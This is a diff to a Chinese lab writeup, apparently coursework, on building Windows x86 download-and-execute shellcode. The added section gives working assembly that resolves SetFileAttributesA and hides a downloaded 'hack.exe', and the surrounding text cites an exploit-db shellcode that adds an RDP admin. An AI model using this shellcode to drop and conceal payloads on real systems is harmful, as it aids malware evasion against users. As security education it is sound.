@@ -99,6 +99,8 @@
 
 ## 编写下载执行程序的 shellcode
 
+### 基本下载执行操作
+
 - `URLDownloadToFileA`函数位于`urlmon.dll`，直接加载这个 DLL 似乎不那么方便，但是可以通过`kernel32.dll`中的`LoadLibraryA`函数来加载，这样改写代码的难度就小了很多。（参考：[Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode](https://www.exploit-db.com/exploits/48355)）
 - 要注意字符串存储的位置应与`findFunctionAddr`中查找字符串的位置一致
     ```
@@ -231,9 +233,46 @@
 
   - 因为没有下配置文件所以会报错，并生成一个配置文件【Σ( ° △ °|||)︴产生多余文件好像不是什么明智的选择】
 
+### 隐藏下载文件
+
+- 隐藏文件使用的是`SetFileAttributesA`函数，修改文件的属性，属于`Kernel32.dll`
+- 先找到函数地址，需要调用之前的`GetProcAddress`函数
+  ```
+  ; Finding address of SetFileAttributesA()
+  xor edx, edx
+  mov edx, 0x4173		; As
+  push edx
+  push 0x65747562		; etub
+  push 0x69727474		; irtt
+  push 0x41656C69		; Aeli
+  push 0x46746553		; FteS
+  push esp
+  push dword [ebp-0x4]	; $lpProcName -- push base address of kernel32.dll to the stack
+  mov eax, [ebp-0x1C]	; PTR to GetProcAddress to EAX
+  call eax
+  ```
+- 调用`SetFileAttributesA`函数，将文件隐藏
+  ```
+  ; Call SetFileAttributesA("hack.exe", FILE_ATTRIBUTE_HIDDEN)
+  xor ecx, ecx
+  push ecx
+  push 0x6578652E         ; exe.
+  push 0x6B636168         ; kcah
+  mov ebx, esp
+  xor edx, edx
+  add edx, 2 		; FILE_ATTRIBUTE_HIDDEN
+  push edx
+  push ebx
+  call eax
+  ```
+- 实验效果如下：<br>
+
+  <img src="img/goose-hack-hidden.gif" alt="消失的无名之鹅" width=700px>
+
 ## 参考资料
 
 - [Windows 管理用户账号](https://blog.csdn.net/weixin_44520274/article/details/86693403)
 - [Buffer Overflow Attacks: Detect, Exploit, Prevent](https://books.google.com.hk/books?id=NYyKhOqOCF8C&pg=PA64&lpg=PA64&dq=mov+%09al,%0959%09%09%09;sys_execve&source=bl&ots=zbE4Xtl8nE&sig=ACfU3U3hHQ2-GoS2WajgsesvVZkMsYpsew&hl=en&sa=X&ved=2ahUKEwjS8KzrhYvpAhXEJaYKHVLaC5MQ6AEwAnoECAsQAQ#v=onepage&q=mov%20%09al%2C%0959%09%09%09%3Bsys_execve&f=false)
 - [mmap(2) - Linux manual page](https://www.baidu.com/baidu?wd=mmap&ie=utf-8&tn=monline_4_dg)
 - [URLDownloadToFile function](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85))
+- [SetFileAttributesA function](https://docs.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-setfileattributesa?redirectedfrom=MSDN)
